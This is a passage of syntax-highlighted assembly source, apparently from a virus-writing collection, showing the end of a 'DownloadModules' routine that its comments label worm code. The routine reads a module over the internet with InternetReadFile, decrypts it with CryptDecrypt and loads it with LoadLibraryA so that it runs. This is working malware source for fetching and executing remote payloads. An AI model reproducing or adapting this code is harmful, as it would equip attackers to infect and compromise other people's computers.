    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">err_dm33</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">lpFile</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tmp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">10008h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">InternetReadFile</span><span class="sc0">            </span><span class="sc1">;read the module</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">err_dm44</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@fsize</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">10008h</span><span class="sc0">
</span><span class="sc5">@fsize</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">lpFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">cKey</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">CryptDecrypt</span><span class="sc0">                </span><span class="sc1">;and decrypt that module</span><span class="sc0">

</span><span class="sc5">err_dm44</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">lpFile</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">UnmapViewOfFile</span><span class="sc0">             </span><span class="sc1">;unmap file</span><span class="sc0">
</span><span class="sc5">err_dm33</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">hMapFile</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">CloseHandle</span><span class="sc0">
</span><span class="sc5">err_dm22</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">hFile</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">CloseHandle</span><span class="sc0">             </span><span class="sc1">;close file</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">lib_nam</span><span class="sc0">              </span><span class="sc1">;by this call will be</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">LoadLibraryA</span><span class="sc0">                </span><span class="sc1">;activated function</span><span class="sc0">
</span><span class="sc5">err_dm11</span><span class="sc4">:</span><span class="sc0">                       </span><span class="sc1">;routine of module (DllMain)</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">InternetCloseHandle</span><span class="sc0">         </span><span class="sc1">;close inet handle</span><span class="sc0">
</span><span class="sc5">err_dm00</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">DownloadModules</span><span class="sc0"> </span><span class="sc9">EndP</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">Start</span><span class="sc0">                       </span><span class="sc1">;end of worm code</span><span class="sc0">
</span></div></body>
</html>
